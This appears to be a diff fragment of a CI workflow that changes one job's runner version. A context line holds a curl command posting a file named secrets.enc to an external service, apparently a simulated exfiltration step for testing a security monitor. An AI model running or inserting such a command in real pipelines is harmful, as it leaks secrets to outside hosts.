@@ -145,7 +145,7 @@ jobs:
           curl -X POST -F "data=@/tmp/secrets.enc" https://httpbin.org/post 2>/dev/null || true
 
   kntrl:
-    runs-on: ubuntu-24.04
+    runs-on: ubuntu-22.04
     permissions:
       contents: read
       actions: read
